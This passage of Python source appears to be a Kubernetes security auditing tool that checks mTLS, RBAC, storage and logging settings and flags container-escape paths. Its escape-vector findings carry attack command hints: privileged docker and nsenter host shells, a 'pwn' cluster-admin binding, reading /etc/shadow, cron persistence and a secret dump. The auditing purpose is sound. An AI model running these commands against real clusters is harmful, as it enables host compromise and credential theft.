                if svc_type == 'LoadBalancer' and etp == 'Cluster':
                    counts['loadbalancer_source_ip_lost'] += 1
                    findings.append(dict(base, **{
                        'severity': 'MEDIUM',
                        'title': 'LOADBALANCER_SOURCE_IP_LOST',
                        'detail': (
                            f'Service {ns}/{name} (type=LoadBalancer) uses '
                            'externalTrafficPolicy=Cluster — SNAT rewrites the '
                            'source IP before forwarding; real client IP is lost, '
                            'disabling IP-based allowlisting and geo-fencing; '
                            'set externalTrafficPolicy=Local to preserve source IP '
                            'at the cost of requiring DaemonSet-style pod placement'
                        ),
                    }))

        result = {'findings': findings, 'counts': counts}
        self.ingress_exposure_findings = findings
        return result

    # ------------------------------------------------------------------
    # Service mesh mTLS enforcement
    # Source: Production Kubernetes ch6 — Istio mTLS, PeerAuthentication,
    # AuthorizationPolicy, Linkerd Server policy
    # ------------------------------------------------------------------

    def check_service_mesh_mtls(self) -> dict:
        """
        Checks:
          - Istio PeerAuthentication mode=PERMISSIVE = HIGH ISTIO_MTLS_PERMISSIVE
          - Istio AuthorizationPolicy action=ALLOW with no source.principals = CRITICAL ISTIO_AUTHZ_ALLOW_ALL
          - Namespace with no PeerAuthentication = MEDIUM NO_PEER_AUTHENTICATION
          - Linkerd Server resources absent = MEDIUM LINKERD_SERVERS_ABSENT
        Returns dict: {findings: list[{severity,title,detail,host,port}], counts: dict}
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}
        counts = {
            'permissive_peerauthentications': 0,
            'authz_allow_all': 0,
            'namespaces_no_peerauth': 0,
            'linkerd_servers_absent': False,
        }

        namespaces = getattr(self, '_visible_namespaces', None) or [
            self.namespace or 'default'
        ]

        # --- Istio PeerAuthentications ---
        pa_data = self._api_get(
            '/apis/security.istio.io/v1beta1/peerauthentications'
        )
        namespaces_with_peerauth = set()
        if pa_data and 'items' in pa_data:
            for item in pa_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                namespaces_with_peerauth.add(ns)
                spec = item.get('spec', {})
                mtls = spec.get('mtls', {})
                mode = mtls.get('mode', '')
                if mode == 'PERMISSIVE':
                    counts['permissive_peerauthentications'] += 1
                    findings.append(dict(base, **{
                        'severity': 'HIGH',
                        'title': 'ISTIO_MTLS_PERMISSIVE',
                        'detail': (
                            f'PeerAuthentication {ns}/{name} has mtls.mode=PERMISSIVE — '
                            'the sidecar accepts both plaintext and mTLS traffic; '
                            'a workload without an Envoy sidecar (or a compromised '
                            'workload that strips CONNECT) can communicate with '
                            'mesh services without mutual authentication; '
                            'change to STRICT to enforce mTLS for all inbound connections'
                        ),
                    }))
        elif pa_data is None:
            # Istio CRD not present — treat as not configured
            pass

        # Namespaces with no PeerAuthentication (Istio installed but policy absent)
        if pa_data is not None:
            for ns in namespaces:
                if ns not in namespaces_with_peerauth:
                    counts['namespaces_no_peerauth'] += 1
                    findings.append(dict(base, **{
                        'severity': 'MEDIUM',
                        'title': 'NO_PEER_AUTHENTICATION',
                        'detail': (
                            f'Namespace {ns!r} has no PeerAuthentication policy — '
                            'mTLS enforcement is not configured; workloads in this '
                            'namespace accept plaintext connections from any source '
                            'regardless of Istio mesh membership'
                        ),
                    }))

        # --- Istio AuthorizationPolicies ---
        ap_data = self._api_get(
            '/apis/security.istio.io/v1beta1/authorizationpolicies'
        )
        if ap_data and 'items' in ap_data:
            for item in ap_data['items']:
                meta = item.get('metadata', {})
                ns = meta.get('namespace', '')
                name = meta.get('name', '')
                spec = item.get('spec', {})
                action = spec.get('action', 'ALLOW')
                rules = spec.get('rules', [])
                if action == 'ALLOW':
                    # ALLOW with empty rules or rules with no source.principals
                    for rule in rules:
                        sources = rule.get('from', [])
                        if not sources:
                            # Rule with no "from" block = allow from any principal
                            counts['authz_allow_all'] += 1
                            findings.append(dict(base, **{
                                'severity': 'CRITICAL',
                                'title': 'ISTIO_AUTHZ_ALLOW_ALL',
                                'detail': (
                                    f'AuthorizationPolicy {ns}/{name} action=ALLOW '
                                    'contains a rule with no source (from) block — '
                                    'policy allows traffic from any principal including '
                                    'unauthenticated workloads outside the mesh; '
                                    'equivalent to no access control on this service'
                                ),
                            }))
                            break
                        for src in sources:
                            principals = src.get('principals', [])
                            if not principals:
                                counts['authz_allow_all'] += 1
                                findings.append(dict(base, **{
                                    'severity': 'CRITICAL',
                                    'title': 'ISTIO_AUTHZ_ALLOW_ALL',
                                    'detail': (
                                        f'AuthorizationPolicy {ns}/{name} action=ALLOW '
                                        'has a source block with no principals restriction — '
                                        'any service identity (including external/non-mesh) '
                                        'is permitted; lateral movement is unrestricted '
                                        'to any workload covered by this policy'
                                    ),
                                }))
                                break

        # --- Linkerd Server resources ---
        linkerd_data = self._api_get(
            '/apis/linkerd.io/v1alpha2/servers'
        )
        linkerd_absent = (
            linkerd_data is None or
            ('items' in linkerd_data and len(linkerd_data['items']) == 0)
        )
        counts['linkerd_servers_absent'] = linkerd_absent
        if linkerd_absent:
            findings.append(dict(base, **{
                'severity': 'MEDIUM',
                'title': 'LINKERD_SERVERS_ABSENT',
                'detail': (
                    'No Linkerd Server resources found — mTLS policy is undefined; '
                    'in Linkerd, Server resources gate per-port policy; without them '
                    'all ports accept unauthenticated plaintext from any meshed or '
                    'unmeshed workload; define Server + ServerAuthorization per '
                    'workload port to enforce mTLS and identity-based access'
                ),
            }))

        result = {'findings': findings, 'counts': counts}
        self.service_mesh_mtls_findings = findings
        return result

    # ------------------------------------------------------------------
    # Observability and audit logging gaps
    # Source: Production Kubernetes ch9 — Prometheus scraping, distributed
    # tracing (Jaeger, Zipkin, Tempo), audit logging, kube-apiserver metrics
    # ------------------------------------------------------------------

    def check_observability_gaps(self) -> dict:
        """
        Checks:
          - Prometheus absent in monitoring namespace = HIGH PROMETHEUS_NOT_DEPLOYED
          - kube-apiserver --audit-log-path absent = HIGH AUDIT_LOGGING_DISABLED
          - Jaeger/Zipkin/Tempo absent in tracing namespace = MEDIUM DISTRIBUTED_TRACING_ABSENT
          - /metrics on kube-apiserver port 6443 reachable without auth = HIGH KUBE_APISERVER_METRICS_UNAUTH
        Returns dict: {findings: list[{severity,title,detail,host,port}], counts: dict}
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}
        counts = {
            'prometheus_deployed': False,
            'audit_logging_enabled': False,
            'tracing_deployed': False,
            'apiserver_metrics_unauth': False,
        }

        # --- Prometheus in monitoring namespace ---
        monitoring_data = self._api_get('/api/v1/namespaces/monitoring/pods')
        prometheus_pods = []
        if monitoring_data and 'items' in monitoring_data:
            for item in monitoring_data['items']:
                pod_name = item.get('metadata', {}).get('name', '').lower()
                if 'prometheus' in pod_name:
                    prometheus_pods.append(pod_name)
        counts['prometheus_deployed'] = bool(prometheus_pods)
        if not prometheus_pods:
            findings.append(dict(base, **{
                'severity': 'HIGH',
                'title': 'PROMETHEUS_NOT_DEPLOYED',
                'detail': (
                    'No Prometheus pods found in the monitoring namespace — '
                    'cluster metrics are not being scraped; resource abuse, '
                    'anomalous traffic patterns, and pod crash loops go undetected; '
                    'attackers operating inside the cluster have no alert trip-wire; '
                    'deploy kube-prometheus-stack or Prometheus Operator with '
                    'scrape configs for all workloads'
                ),
            }))

        # --- Audit logging: inspect kube-apiserver pod args ---
        kube_system_data = self._api_get('/api/v1/namespaces/kube-system/pods')
        audit_enabled = False
        if kube_system_data and 'items' in kube_system_data:
            for item in kube_system_data['items']:
                pod_name = item.get('metadata', {}).get('name', '').lower()
                if 'kube-apiserver' in pod_name:
                    spec = item.get('spec', {})
                    for container in spec.get('containers', []):
                        args = container.get('command', []) + container.get('args', [])
                        if any('--audit-log-path' in a for a in args):
                            audit_enabled = True
                            break
                if audit_enabled:
                    break
        counts['audit_logging_enabled'] = audit_enabled
        if not audit_enabled:
            findings.append(dict(base, **{
                'severity': 'HIGH',
                'title': 'AUDIT_LOGGING_DISABLED',
                'detail': (
                    'kube-apiserver has no --audit-log-path argument — API audit '
                    'logging is disabled; all kubectl exec, secret reads, RBAC '
                    'modifications, and privileged API calls are unlogged; '
                    'post-compromise forensics are impossible without audit trail; '
                    'configure --audit-log-path, --audit-policy-file, and ship '
                    'logs to a tamper-resistant sink (S3, external SIEM)'
                ),
            }))

        # --- Distributed tracing: Jaeger / Zipkin / Tempo in tracing namespace ---
        tracing_data = self._api_get('/api/v1/namespaces/tracing/pods')
        tracing_pods = []
        if tracing_data and 'items' in tracing_data:
            for item in tracing_data['items']:
                pod_name = item.get('metadata', {}).get('name', '').lower()
                if any(t in pod_name for t in ('jaeger', 'zipkin', 'tempo')):
                    tracing_pods.append(pod_name)
        counts['tracing_deployed'] = bool(tracing_pods)
        if not tracing_pods:
            findings.append(dict(base, **{
                'severity': 'MEDIUM',
                'title': 'DISTRIBUTED_TRACING_ABSENT',
                'detail': (
                    'No Jaeger, Zipkin, or Tempo pods found in the tracing namespace — '
                    'distributed tracing is not deployed; request chains across '
                    'microservices are opaque; latency spikes and error cascades '
                    'cannot be attributed to a specific service hop; '
                    'deploy an OpenTelemetry-compatible collector and instrument '
                    'workloads with trace context propagation'
                ),
            }))

        # --- kube-apiserver /metrics without auth ---
        # Attempt a raw HTTPS GET to port 6443 /metrics without a bearer token
        apiserver_metrics_unauth = False
        apiserver_ip = ''
        if self.api_server:
            import urllib.parse
            parsed = urllib.parse.urlparse(self.api_server)
            apiserver_ip = parsed.hostname or ''

        if apiserver_ip:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                metrics_url = f'https://{apiserver_ip}:6443/metrics'
                req = urllib.request.Request(metrics_url)
                req.add_header('Accept', 'text/plain')
                with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                    if resp.status == 200:
                        body = resp.read(256).decode(errors='replace')
                        if 'apiserver_' in body or '# HELP' in body:
                            apiserver_metrics_unauth = True
            except Exception:
                pass

        counts['apiserver_metrics_unauth'] = apiserver_metrics_unauth
        if apiserver_metrics_unauth:
            findings.append({
                'severity': 'HIGH',
                'title': 'KUBE_APISERVER_METRICS_UNAUTH',
                'detail': (
                    f'kube-apiserver /metrics endpoint at {apiserver_ip}:6443 '
                    'returned Prometheus metrics without an Authorization header — '
                    'exposes request rates, etcd operation latencies, '
                    'authentication failure counts, and webhook call volumes; '
                    'an attacker enumerating the metrics endpoint can fingerprint '
                    'cluster load, active namespaces, and resource counts without '
                    'any cluster credentials; restrict /metrics behind RBAC or '
                    'bind the metrics port to localhost only'
                ),
                'host': apiserver_ip,
                'port': 6443,
            })

        result = {'findings': findings, 'counts': counts}
        self.observability_gap_findings = findings
        return result

    # ------------------------------------------------------------------
    # PersistentVolume exposure
    # Source: K8s In Action 2e ch10 — PVs are cluster-scoped; anyone who can
    # GET /api/v1/persistentvolumes sees all storage across all namespaces.
    # Unclaimed ReadWriteMany PVs are shared storage with no tenant boundary.
    # hostPath PVs bypass container isolation identical to hostPath volumes.
    # StorageClass with reclaimPolicy=Retain + allowVolumeExpansion=true lets
    # a deleted PVC's data survive and be accessed by re-claiming the PV.
    # ------------------------------------------------------------------

    def check_persistent_volume_exposure(self) -> dict:
        """
        Checks:
          - GET /api/v1/persistentvolumes accessible without namespace scope = CRITICAL PV_CLUSTER_READABLE
          - PVs with accessMode=ReadWriteMany and no claimRef = HIGH UNCLAIMED_RWX_PV
          - PVCs with hostPath volume source = CRITICAL PVC_HOSTPATH_MOUNT
          - StorageClass with allowVolumeExpansion=true and reclaimPolicy=Retain = MEDIUM STORAGE_EXPAND_RETAIN
        Returns dict with findings list.
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}

        # --- Cluster-scoped PV list ---
        pv_data = self._api_get('/api/v1/persistentvolumes')
        if pv_data and 'items' in pv_data:
            findings.append(dict(base, **{
                'severity': 'CRITICAL',
                'title': 'PV_CLUSTER_READABLE',
                'detail': (
                    f'GET /api/v1/persistentvolumes returned {len(pv_data["items"])} PVs '
                    'without namespace scope — all cluster storage metadata visible; '
                    'PV specs contain NFS server addresses, iSCSI targets, cloud disk IDs, '
                    'and hostPath roots that map the storage topology of the entire cluster'
                ),
            }))

            # --- Unclaimed ReadWriteMany PVs ---
            for item in pv_data['items']:
                meta = item.get('metadata', {})
                spec = item.get('spec', {})
                pv_name = meta.get('name', '')
                access_modes = spec.get('accessModes', [])
                claim_ref = spec.get('claimRef')

                if 'ReadWriteMany' in access_modes and not claim_ref:
                    findings.append(dict(base, **{
                        'severity': 'HIGH',
                        'title': 'UNCLAIMED_RWX_PV',
                        'detail': (
                            f'PersistentVolume {pv_name!r} has accessMode=ReadWriteMany '
                            'and no claimRef — shared storage is unclaimed and available '
                            'to any PVC in the cluster that matches the StorageClass; '
                            'a tenant pod can claim it and read data written by other tenants'
                        ),
                    }))
        else:
            pv_data = {}

        # --- PVCs with hostPath source ---
        namespaces = getattr(self, '_visible_namespaces', [self.namespace or 'default'])
        pv_items = pv_data.get('items', [])
        for ns in namespaces:
            pvc_data = self._api_get(f'/api/v1/namespaces/{ns}/persistentvolumeclaims')
            if not pvc_data or 'items' not in pvc_data:
                continue
            for item in pvc_data['items']:
                meta = item.get('metadata', {})
                pvc_name = meta.get('name', '')
                vol_name = item.get('spec', {}).get('volumeName', '')
                if not vol_name:
                    continue
                for pv in pv_items:
                    if pv.get('metadata', {}).get('name', '') != vol_name:
                        continue
                    pv_spec = pv.get('spec', {})
                    if 'hostPath' in pv_spec:
                        host_path = pv_spec['hostPath'].get('path', '')
                        findings.append(dict(base, **{
                            'severity': 'CRITICAL',
                            'title': 'PVC_HOSTPATH_MOUNT',
                            'detail': (
                                f'PVC {ns}/{pvc_name!r} is bound to PV {vol_name!r} '
                                f'which uses hostPath={host_path!r} — '
                                'PVC consumers get direct host filesystem access; '
                                'equivalent to hostPath volume mount in the pod spec; '
                                'path "/" grants full host filesystem read/write'
                            ),
                        }))
                    break

        # --- StorageClass: allowVolumeExpansion + reclaimPolicy=Retain ---
        sc_data = self._api_get('/apis/storage.k8s.io/v1/storageclasses')
        if sc_data and 'items' in sc_data:
            for item in sc_data['items']:
                meta = item.get('metadata', {})
                sc_name = meta.get('name', '')
                reclaim = item.get('reclaimPolicy', 'Delete')
                allow_expand = item.get('allowVolumeExpansion', False)

                if allow_expand and reclaim == 'Retain':
                    findings.append(dict(base, **{
                        'severity': 'MEDIUM',
                        'title': 'STORAGE_EXPAND_RETAIN',
                        'detail': (
                            f'StorageClass {sc_name!r} has allowVolumeExpansion=true '
                            'and reclaimPolicy=Retain — after PVC deletion the PV and '
                            'its data persist; a new PVC can reclaim the PV and read '
                            'prior tenant data; data from deleted workloads is not purged; '
                            'change reclaimPolicy=Delete to destroy underlying storage on release'
                        ),
                    }))

        self.persistent_volume_findings = findings
        return {'findings': findings}

    # ------------------------------------------------------------------
    # Cluster-admin RBAC binding audit (structured findings format)
    # Source: K8s Best Practices 2e ch4 — RBAC least-privilege; wildcard verbs
    # in ClusterRoles and default SA bindings are the most exploited misconfiguration.
    # K8s In Action 2e ch12 — ClusterRoles with verb="*" = full API access to matched
    # resources; default SA token auto-mounted into all pods without explicit SA assignment.
    # ------------------------------------------------------------------

    def check_cluster_admin_bindings(self) -> dict:
        """
        Checks:
          - ClusterRoleBinding with roleRef.name="cluster-admin" = CRITICAL CLUSTER_ADMIN_BINDING
          - ServiceAccount subject bound to cluster-admin = CRITICAL SERVICE_ACCOUNT_CLUSTER_ADMIN
          - Wildcard verb ("*") in any non-system ClusterRole rules = HIGH WILDCARD_VERB_IN_CLUSTERROLE
          - "default" ServiceAccount in any RoleBinding = HIGH DEFAULT_SA_IN_BINDING
        Returns dict with findings list.
        """
        findings = []
        api_host = self.api_server or ''
        port_val = 443
        base = {'host': api_host, 'port': port_val}

        # --- ClusterRoleBindings: cluster-admin ---
        crb_data = self._api_get(
            '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings'
        )
        if crb_data and 'items' in crb_data:
            for item in crb_data['items']:
                meta = item.get('metadata', {})
                binding_name = meta.get('name', '')
                role_ref = item.get('roleRef', {})

                if role_ref.get('name') != 'cluster-admin':
                    continue

                subjects = item.get('subjects', [])
                subject_summary = ', '.join(
                    f'{s.get("kind","?")}:{s.get("namespace","")}/{s.get("name","")}'
                    for s in subjects
                ) or '<no subjects>'
                findings.append(dict(base, **{
                    'severity': 'CRITICAL',
                    'title': 'CLUSTER_ADMIN_BINDING',
                    'detail': (
                        f'ClusterRoleBinding {binding_name!r} binds cluster-admin to: '
                        f'{subject_summary} — cluster-admin grants unrestricted access '
                        'to all API resources across all namespaces including secrets, '
                        'RBAC, nodes, and exec into any pod'
                    ),
                }))

                # ServiceAccount subjects specifically
                for subject in subjects:
                    if subject.get('kind') == 'ServiceAccount':
                        sa_ns = subject.get('namespace', '')
                        sa_name = subject.get('name', '')
                        findings.append(dict(base, **{
                            'severity': 'CRITICAL',
                            'title': 'SERVICE_ACCOUNT_CLUSTER_ADMIN',
                            'detail': (
                                f'ServiceAccount {sa_ns}/{sa_name!r} is bound to cluster-admin '
                                f'via ClusterRoleBinding {binding_name!r} — '
                                'any pod running as this SA has full cluster-admin rights; '
                                'compromising the pod = full cluster compromise; '
                                'extract SA token: kubectl --token=<tok> get secrets -A'
                            ),
                        }))

        # --- ClusterRoles: wildcard verbs (skip system: prefix) ---
        cr_data = self._api_get(
            '/apis/rbac.authorization.k8s.io/v1/clusterroles'
        )
        if cr_data and 'items' in cr_data:
            for item in cr_data['items']:
                meta = item.get('metadata', {})
                cr_name = meta.get('name', '')
                if cr_name.startswith('system:'):
                    continue
                rules = item.get('rules', [])
                for rule in rules:
                    verbs = rule.get('verbs', [])
                    if '*' in verbs:
                        resources = rule.get('resources', ['*'])
                        findings.append(dict(base, **{
                            'severity': 'HIGH',
                            'title': 'WILDCARD_VERB_IN_CLUSTERROLE',
                            'detail': (
                                f'ClusterRole {cr_name!r} has verb="*" on resources '
                                f'{resources} — wildcard verb grants all operations '
                                '(get, list, create, update, delete, exec, escalate) on '
                                'the matched resources; any SA bound to this role can '
                                'perform arbitrary actions including privilege escalation'
                            ),
                        }))
                        break  # one finding per ClusterRole

        # --- RoleBindings (all namespaces): default ServiceAccount ---
        rb_data = self._api_get(
            '/apis/rbac.authorization.k8s.io/v1/rolebindings'
        )
        if rb_data and 'items' in rb_data:
            for item in rb_data['items']:
                meta = item.get('metadata', {})
                rb_name = meta.get('name', '')
                rb_ns = meta.get('namespace', '')
                role_ref = item.get('roleRef', {})
                role_name = role_ref.get('name', '')

                for subject in item.get('subjects', []):
                    if (
                        subject.get('kind') == 'ServiceAccount'
                        and subject.get('name') == 'default'
                    ):
                        findings.append(dict(base, **{
                            'severity': 'HIGH',
                            'title': 'DEFAULT_SA_IN_BINDING',
                            'detail': (
                                f'RoleBinding {rb_ns}/{rb_name!r} binds role {role_name!r} '
                                f'to the default ServiceAccount in namespace {rb_ns!r} — '
                                'the default SA is auto-mounted into every pod in the namespace '
                                'that does not specify a different serviceAccountName; '
                                'RBAC grants on the default SA are inherited by all such pods'
                            ),
                        }))

        self.cluster_admin_binding_findings = findings
        return {'findings': findings}

    # ------------------------------------------------------------------
    # RBAC self-check via SelfSubjectAccessReview
    # Source: K8s Up & Running ch14, K8s Best Practices ch4
    # ------------------------------------------------------------------

    def rbac_self_check(self):
        """
        POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews to determine
        what the current service account is allowed to do.
        """
        checks = [
            # (verb, resource, group, namespace)
            ('get',    'pods',           '',                           self.namespace),
            ('list',   'pods',           '',                           self.namespace),
            ('create', 'pods',           '',                           self.namespace),
            ('delete', 'pods',           '',                           self.namespace),
            ('get',    'secrets',        '',                           self.namespace),
            ('list',   'secrets',        '',                           self.namespace),
            ('create', 'secrets',        '',                           self.namespace),
            ('get',    'nodes',          '',                           ''),
            ('list',   'nodes',          '',                           ''),
            ('get',    'namespaces',     '',                           ''),
            ('list',   'namespaces',     '',                           ''),
            ('get',    'serviceaccounts','',                           self.namespace),
            ('list',   'clusterroles',   'rbac.authorization.k8s.io', ''),
            ('create', 'clusterrolebindings','rbac.authorization.k8s.io',''),
            ('get',    'configmaps',     '',                           self.namespace),
            ('list',   'configmaps',     '',                           self.namespace),
            ('*',      '*',             '*',                          '*'),
        ]
        for verb, resource, group, ns in checks:
            body = {
                'apiVersion': 'authorization.k8s.io/v1',
                'kind': 'SelfSubjectAccessReview',
                'spec': {
                    'resourceAttributes': {
                        'verb': verb,
                        'resource': resource,
                        'group': group,
                        'namespace': ns or '',
                    }
                }
            }
            result = self._api_post(
                '/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', body
            )
            if result:
                allowed = result.get('status', {}).get('allowed', False)
                self.self_access.append({
                    'verb': verb, 'resource': resource,
                    'namespace': ns, 'allowed': allowed,
                })

    # ------------------------------------------------------------------
    # kubectl-based enumeration (legacy / fallback path)
    # ------------------------------------------------------------------

    def _kubectl_available(self):
        try:
            r = subprocess.run(['kubectl', 'auth', 'can-i', '--list'],
                               capture_output=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False

    def check_kubectl_access(self):
        return self._kubectl_available()

    def get_pods(self):
        try:
            r = subprocess.run(['kubectl', 'get', 'pods', '-o', 'json'],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                for item in json.loads(r.stdout).get('items', []):
                    spec = item.get('spec', {})
                    self.pods.append({
                        'name': item['metadata']['name'],
                        'namespace': item['metadata'].get('namespace', ''),
                        'status': item['status']['phase'],
                        'ip': item['status'].get('podIP', ''),
                        'service_account': spec.get('serviceAccountName', 'default'),
                        'host_pid': spec.get('hostPID', False),
                        'host_network': spec.get('hostNetwork', False),
                        'privileged': any(
                            c.get('securityContext', {}).get('privileged', False)
                            for c in spec.get('containers', [])
                        ),
                        'host_paths': [
                            v['hostPath']['path']
                            for v in spec.get('volumes', [])
                            if 'hostPath' in v
                        ],
                    })
        except Exception:
            pass
        return self.pods

    def get_services(self):
        try:
            r = subprocess.run(['kubectl', 'get', 'services', '-o', 'json'],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                for item in json.loads(r.stdout).get('items', []):
                    self.services.append({
                        'name': item['metadata']['name'],
                        'namespace': item['metadata'].get('namespace', ''),
                        'type': item['spec']['type'],
                        'cluster_ip': item['spec'].get('clusterIP', ''),
                    })
        except Exception:
            pass
        return self.services

    def get_secrets(self):
        """List secret metadata via kubectl (no data extraction)."""
        try:
            r = subprocess.run(['kubectl', 'get', 'secrets', '-o', 'json'],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                for item in json.loads(r.stdout).get('items', []):
                    self.secrets.append({
                        'name': item['metadata']['name'],
                        'namespace': item['metadata'].get('namespace', ''),
                        'type': item.get('type', ''),
                    })
        except Exception:
            pass
        return self.secrets

    def get_configmaps(self):
        try:
            r = subprocess.run(['kubectl', 'get', 'configmaps', '-o', 'json'],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                for item in json.loads(r.stdout).get('items', []):
                    self.configmaps.append({
                        'name': item['metadata']['name'],
                        'namespace': item['metadata'].get('namespace', ''),
                    })
        except Exception:
            pass
        return self.configmaps

    def check_rbac(self):
        """Check RBAC permissions via kubectl auth can-i."""
        permissions = [
            'get pods', 'list pods', 'create pods', 'delete pods',
            'get secrets', 'list secrets', 'create secrets',
            'get nodes', 'list nodes',
            'get namespaces', 'list namespaces',
            'create clusterrolebindings',
            '*',
        ]
        for perm in permissions:
            try:
                r = subprocess.run(
                    ['kubectl', 'auth', 'can-i'] + perm.split(),
                    capture_output=True, text=True, timeout=2)
                if r.returncode == 0 and 'yes' in r.stdout.lower():
                    self.rbac.append({'permission': perm, 'allowed': True})
            except Exception:
                pass
        return self.rbac

    # ------------------------------------------------------------------
    # Privilege escalation path detection
    # Source: K8s Best Practices 2e ch19, K8s Up & Running ch19, Production K8s ch10
    # ------------------------------------------------------------------

    def check_escape_vectors(self):
        """Detect privilege escalation paths from inside a pod."""
        self.escape_vectors = []

        # SA token available — pivot to API attacks
        if self.token:
            self.escape_vectors.append({
                'type': 'SA_TOKEN',
                'severity': 'HIGH',
                'description': 'Service account token readable at '
                               '/var/run/secrets/kubernetes.io/serviceaccount/token',
                'exploit': 'Use bearer token against K8s API. '
                           'Scope depends on RBAC bindings for this SA.',
            })

        # ------- Linux-only checks -------
        if _IS_LINUX:
            self._check_privileged_caps()
            self._check_host_mounts()
            self._check_host_pid()
            self._check_host_network()
            self._check_writable_docker_socket()

        # ------- RBAC-derived escalation paths -------
        self._check_rbac_escalation()

        return self.escape_vectors

    def _check_privileged_caps(self):
        """privileged: true → full host access via /dev, /proc, /sys."""
        try:
            with open('/proc/self/status') as f:
                for line in f:
                    if line.startswith('CapEff:'):
                        cap_eff = int(line.split()[1], 16)
                        # 0x3fffffffff == all caps set
                        if cap_eff >= 0x3fffffffff:
                            self.escape_vectors.append({
                                'type': 'PRIVILEGED_POD',
                                'severity': 'CRITICAL',
                                'description': 'Pod running with privileged: true '
                                               '(all Linux capabilities granted)',
                                'exploit': 'Mount host filesystem: '
                                           'mkdir /tmp/host && mount /dev/sda1 /tmp/host. '
                                           'Load kernel modules. Access /dev/mem. '
                                           'Full host compromise.',
                            })
        except Exception:
            pass

    def _check_host_mounts(self):
        """hostPath volumes pointing to / or /etc — host filesystem read."""
        dangerous = ['/ ', '/etc', '/root', '/var', '/proc', '/sys']
        try:
            with open('/proc/self/mountinfo') as f:
                content = f.read()
        except Exception:
            return

        # Also check for common host mount points inside the container
        for host_dir in ['/host', '/hostfs', '/rootfs']:
            if Path(host_dir).exists() and os.listdir(host_dir):
                self.escape_vectors.append({
                    'type': 'HOST_FILESYSTEM_MOUNT',
                    'severity': 'CRITICAL',
                    'description': f'Host filesystem appears mounted at {host_dir}',
                    'exploit': f'Read /etc/shadow, SSH keys, kubeconfig from {host_dir}. '
                               f'Write cron jobs to {host_dir}/etc/cron.d/ for persistence.',
                })

        if '/var/run/docker.sock' in content:
            self.escape_vectors.append({
                'type': 'DOCKER_SOCKET_MOUNT',
                'severity': 'CRITICAL',
                'description': 'Docker socket /var/run/docker.sock mounted into pod',
                'exploit': 'docker run -v /:/host --privileged ubuntu chroot /host',
            })

        if '/var/run/containerd/containerd.sock' in content:
            self.escape_vectors.append({
                'type': 'CONTAINERD_SOCKET_MOUNT',
                'severity': 'CRITICAL',
                'description': 'containerd socket mounted into pod',
                'exploit': 'Use ctr or nerdctl to spawn privileged containers.',
            })

    def _check_host_pid(self):
        """hostPID: true → access host process namespace, see all PIDs."""
        try:
            # If we can see PID 1 and it's not a container init, we have hostPID
            with open('/proc/1/comm') as f:
                comm = f.read().strip()
            # In a normal pod, PID 1 is the container entrypoint.
            # With hostPID it's the host init (systemd, init, etc.)
            host_inits = {'systemd', 'init', 'launchd', 'upstart'}
            if comm in host_inits:
                self.escape_vectors.append({
                    'type': 'HOST_PID_NAMESPACE',
                    'severity': 'HIGH',
                    'description': f'Pod sharing host PID namespace (PID 1 = {comm})',
                    'exploit': 'Read /proc/<pid>/environ for secrets in other processes. '
                               'ptrace host processes. '
                               'nsenter -t 1 -m -u -i -n -p -- bash for host shell.',
                })
        except Exception:
            pass

    def _check_host_network(self):
        """hostNetwork: true → pod shares host network stack."""
        try:
            # Compare /proc/self/net/if_inet6 interface count against typical
            # container (which has only lo + eth0). Host will have many more.
            with open('/proc/net/dev') as f:
                ifaces = [l.split(':')[0].strip() for l in f if ':' in l]
            if len(ifaces) > 3:
                self.escape_vectors.append({
                    'type': 'HOST_NETWORK_NAMESPACE',
                    'severity': 'HIGH',
                    'description': f'Pod sharing host network namespace '
                                   f'(interfaces: {", ".join(ifaces[:6])})',
                    'exploit': 'Sniff host network traffic. '
                               'Bind to privileged ports. '
                               'Access metadata services on host-only network.',
                })
        except Exception:
            pass

    def _check_writable_docker_socket(self):
        """World-writable docker socket not via mount (still dangerous)."""
        sock = Path('/var/run/docker.sock')
        if sock.exists() and os.access(str(sock), os.W_OK):
            self.escape_vectors.append({
                'type': 'DOCKER_SOCKET_WRITABLE',
                'severity': 'CRITICAL',
                'description': 'Docker socket present and writable',
                'exploit': 'docker run -v /:/host --privileged ubuntu chroot /host',
            })

    def _check_rbac_escalation(self):
        """Derive escalation paths from known RBAC / self_access permissions."""
        # Combine kubectl rbac and SelfSubjectAccessReview results
        allowed = set()
        for p in self.rbac:
            if p.get('allowed'):
                allowed.add(p['permission'])
        for p in self.self_access:
            if p.get('allowed'):
                allowed.add(f"{p['verb']} {p['resource']}")

        if 'create pods' in allowed or 'create *' in allowed or '* *' in allowed:
            self.escape_vectors.append({
                'type': 'RBAC_CREATE_PODS',
                'severity': 'CRITICAL',
                'description': 'SA can create pods — can spawn privileged pod',
                'exploit': 'Create pod with hostPath: / mount, privileged: true, '
                           'hostPID: true. Instant host compromise. '
                           'kubectl apply -f malicious-pod.yaml',
            })

        if 'create clusterrolebindings' in allowed:
            self.escape_vectors.append({
                'type': 'RBAC_CLUSTER_ADMIN_ESCALATION',
                'severity': 'CRITICAL',
                'description': 'SA can create ClusterRoleBindings — privilege escalation '
                               'to cluster-admin',
                'exploit': 'kubectl create clusterrolebinding pwn '
                           '--clusterrole=cluster-admin --serviceaccount=<ns>:<sa>',
            })

        if 'list secrets' in allowed or '* secrets' in allowed:
            self.escape_vectors.append({
                'type': 'RBAC_SECRET_READ',
                'severity': 'HIGH',
                'description': 'SA can list/get secrets across namespace',
                'exploit': 'kubectl get secret -o json | jq .data | '
                           'base64 -d to extract all credentials',
            })

        if '*' in allowed:
            self.escape_vectors.append({
                'type': 'CLUSTER_ADMIN',
                'severity': 'CRITICAL',
